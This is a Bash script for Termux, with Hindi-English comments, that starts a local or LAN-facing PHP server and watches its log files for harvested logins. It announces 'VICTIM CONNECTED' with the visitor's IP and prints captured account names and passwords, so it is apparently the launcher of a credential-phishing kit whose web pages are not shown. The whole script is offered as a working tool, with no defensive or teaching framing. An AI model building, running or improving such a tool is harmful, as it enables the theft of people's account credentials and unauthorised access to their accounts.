#!/bin/bash

# --- 🛠️ PERMISSION FIX (TERMUX SPECIAL) ---
# Hum Termux ke HOME folder me ek Temp directory banayenge
# Taki permission denied ka error kabhi na aaye
mkdir -p $HOME/.php_tmp
chmod 777 $HOME/.php_tmp
export TMPDIR=$HOME/.php_tmp

# --- 🎨 COLORS ---
GOLD='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RED='\033[1;31m'
GREEN='\033[1;32m'
RESET='\033[0m'

# --- 🛡️ ICONS ---
ICON_WIFI="📡"
ICON_USER="💀"
ICON_KEY="🔑"
ICON_CHECK="✅"

# --- CLEANUP (Jab aap Ctrl+C dabayenge tab hi band hoga) ---
trap "echo -e '\n${RED}[!] Stopping Server... Exiting.${RESET}'; pkill -f php; exit" SIGINT SIGTERM

# --- SETUP ---
pkill -f php > /dev/null 2>&1  # Purana server band karein
rm -rf usernames.txt ip.txt
touch usernames.txt ip.txt

# --- BANNER ---
clear
echo -e "${GOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║          ${WHITE}NEVER STOP EDITION (Termux Fix)${GOLD}             ║"
echo "║         ${CYAN}CREATED BY : ANURAG HKR${GOLD}                      ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# --- MENU ---
echo -e "${GREEN}[01] Localhost (127.0.0.1)"
echo -e "${GREEN}[02] LAN / WiFi Network"
echo ""
echo -ne "${GOLD}Select Option : ${RESET}"
read -n 1 option
echo ""
echo ""

# --- SERVER LOGIC ---
if [[ $option == "1" ]]; then
    HOST="127.0.0.1"
    PORT="8080"
elif [[ $option == "2" ]]; then
    HOST="0.0.0.0"
    PORT="8080"
else
    echo -e "${RED}[!] Wrong Option Selected. Defaulting to Localhost.${RESET}"
    HOST="127.0.0.1"
    PORT="8080"
fi

# --- START SERVER ---
echo -e "${CYAN}[*] Starting PHP Server...${RESET}"

# Server start command
php -S $HOST:$PORT -t . > php_error.log 2>&1 &
PID_PHP=$!
sleep 2

# --- ERROR CHECK (Agar server start nahi hua to batayega) ---
if ! ps -p $PID_PHP > /dev/null; then
    echo -e "${RED}[!] SERVER CRASHED! Error Log Niche Hai:${RESET}"
    echo -e "${GOLD}------------------------------------------${RESET}"
    cat php_error.log
    echo -e "${GOLD}------------------------------------------${RESET}"
    echo -e "${RED}[!] Script band nahi hogi. Ctrl+C dabakar band karein.${RESET}"
    
    # Ye loop script ko band hone se rokega
    while true; do sleep 1; done
fi

# --- SUCCESS MESSAGE ---
echo -e "${ICON_CHECK} ${GREEN}Server Started Successfully!${RESET}"
echo -e "${ICON_WIFI} ${WHITE}Link: http://$HOST:$PORT ${RESET}"
echo -e "${GOLD}[-] Waiting for Login Info... (Press Ctrl + C to Stop)${RESET}"
echo ""

# --- MONITORING LOOP (Ye chalta rahega) ---
# 'tail -f' command file ko lagatar padhti rahegi
tail -f usernames.txt ip.txt --pid=$PID_PHP 2>/dev/null | while read line; do
    if [[ "$line" == "IP:"* ]]; then
        IP=${line#IP: }
        echo -e "\n${GOLD}[+] VICTIM CONNECTED: ${CYAN}$IP${RESET}"
        echo -e "\a"
    elif [[ "$line" == *"Login info Found"* ]]; then
        echo -e "${RED}[+] CREDENTIALS CAPTURED!${RESET}"
    elif [[ "$line" == *"Account"* ]]; then
        echo -e "${GREEN}$line${RESET}"
    elif [[ "$line" == *"Password"* ]]; then
        echo -e "${GREEN}$line${RESET}"
        echo -e "\a"
    fi
done

# --- FINAL SAFETY NET ---
# Agar upar ka code fail hua, to ye infinite loop script ko pakad lega
while true; do
    sleep 1
done
